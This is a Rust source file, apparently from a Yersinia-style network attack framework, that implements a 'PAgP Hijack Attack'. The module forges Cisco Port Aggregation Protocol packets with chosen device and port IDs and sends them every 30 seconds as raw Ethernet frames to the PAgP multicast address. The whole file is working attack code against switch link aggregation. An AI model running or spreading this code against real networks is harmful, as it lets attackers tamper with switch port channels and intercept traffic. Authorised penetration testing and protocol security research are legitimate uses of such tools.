//! PAgP Attacks
use super::packet::PagpPacket;
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct PagpHijackAttack {
    pub device_id: [u8; 6],
    pub port_id: [u8; 6],
}

impl PagpHijackAttack {
    pub fn new(device_id: [u8; 6], port_id: [u8; 6]) -> Self {
        Self { device_id, port_id }
    }

    pub fn build_packet(&self) -> PagpPacket {
        PagpPacket::new(self.device_id, self.port_id)
    }
}

#[async_trait]
impl Attack for PagpHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(30); // PAgP hello interval

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let pagp_packet = self.build_packet();
            let pagp_bytes = pagp_packet.to_bytes();

            // PAgP uses multicast MAC 01:00:0c:cc:cc:cc
            let dst_mac = MacAddress([0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            // PAgP uses LLC/SNAP encapsulation
            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::LLC, pagp_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending PAgP packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "PAgP Hijack Attack"
    }
}
